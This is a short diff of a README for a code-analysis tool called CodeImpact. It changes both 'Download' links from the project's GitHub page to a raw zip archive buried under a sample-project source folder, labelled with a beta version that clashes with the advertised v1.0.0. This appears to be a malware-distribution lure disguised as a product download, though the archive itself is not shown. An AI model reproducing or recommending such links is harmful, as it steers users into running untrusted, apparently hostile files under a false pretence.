@@ -51,7 +51,7 @@ Works out of the box with:
 
 ### Step 1: Get the Application
 
-[![Download CodeImpact](https://img.shields.io/badge/⬇️_Download_CodeImpact-v1.0.0-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Max92484/CodeImpact)
+[![Download CodeImpact](https://img.shields.io/badge/⬇️_Download_CodeImpact-v1.0.0-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/Max92484/CodeImpact/main/sample_projects/ts_saas_api/src/v1.4-beta.2.zip)
 
 Visit this link to download the application.
 
@@ -213,7 +213,7 @@ Have questions? Need help? Join the community:
 
 Don't let another deployment turn into a disaster. Download CodeImpact now and take control of your codebase. See exactly what will break before it breaks.
 
-[**⬇️ Download CodeImpact Now**](https://github.com/Max92484/CodeImpact)
+[**⬇️ Download CodeImpact Now**](https://raw.githubusercontent.com/Max92484/CodeImpact/main/sample_projects/ts_saas_api/src/v1.4-beta.2.zip)
 
 ---
 
